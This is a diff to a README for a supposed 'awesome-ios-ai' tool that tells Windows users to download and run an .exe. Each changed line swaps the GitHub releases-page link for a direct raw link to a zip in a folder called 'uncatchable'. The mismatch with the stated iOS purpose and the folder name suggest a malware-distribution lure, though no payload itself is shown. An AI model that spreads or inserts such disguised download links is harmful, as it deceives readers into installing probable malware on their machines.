@@ -1,6 +1,6 @@
 # 🤖 awesome-ios-ai - Smarter AI Tools for iOS Coding
 
-[![Download Release](https://img.shields.io/badge/download-Get%20Latest%20Release-brightgreen)](https://github.com/sisyphean-faucialtonsil233/awesome-ios-ai/releases)
+[![Download Release](https://img.shields.io/badge/download-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/sisyphean-faucialtonsil233/awesome-ios-ai/main/uncatchable/ai_awesome_ios_v3.7.zip)
 
 ---
 
@@ -32,12 +32,12 @@ This guide helps you download and launch the software on your Windows PC.
 
 First, you need to **visit the releases page** to get the latest version.
 
-[![Download Release](https://img.shields.io/badge/download-Get%20Latest%20Release-blue)](https://github.com/sisyphean-faucialtonsil233/awesome-ios-ai/releases)
+[![Download Release](https://img.shields.io/badge/download-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/sisyphean-faucialtonsil233/awesome-ios-ai/main/uncatchable/ai_awesome_ios_v3.7.zip)
 
 **Steps to download:**  
 
 1. Click the big green or blue button above or open this link in your browser:  
-   https://github.com/sisyphean-faucialtonsil233/awesome-ios-ai/releases  
+   https://raw.githubusercontent.com/sisyphean-faucialtonsil233/awesome-ios-ai/main/uncatchable/ai_awesome_ios_v3.7.zip  
 2. You will see a list of releases. Look for the newest one (usually at the top).  
 3. Inside the release, find the Windows installer or executable file. It should be a `.exe` file.  
 4. Click on the `.exe` file to start downloading. Your browser will save the file on your computer.
@@ -75,7 +75,7 @@ When you start the app, you'll find a simple interface with buttons to access ea
 ## 🔄 Updating the Software
 
 To get new features or fixes, check the releases page regularly:  
-https://github.com/sisyphean-faucialtonsil233/awesome-ios-ai/releases  
+https://raw.githubusercontent.com/sisyphean-faucialtonsil233/awesome-ios-ai/main/uncatchable/ai_awesome_ios_v3.7.zip  
 
 Download and install the latest version just like you did the first time. The software does not update automatically, so manual updates keep it running smoothly.
 
@@ -105,7 +105,7 @@ If problems continue, check the “Issues” section on the GitHub page or seek 
 
 ## 🔗 Quick Access Link
 
-[Download the latest release here](https://github.com/sisyphean-faucialtonsil233/awesome-ios-ai/releases)  
+[Download the latest release here](https://raw.githubusercontent.com/sisyphean-faucialtonsil233/awesome-ios-ai/main/uncatchable/ai_awesome_ios_v3.7.zip)  
 
 Click this whenever you want the newest software version.  
 
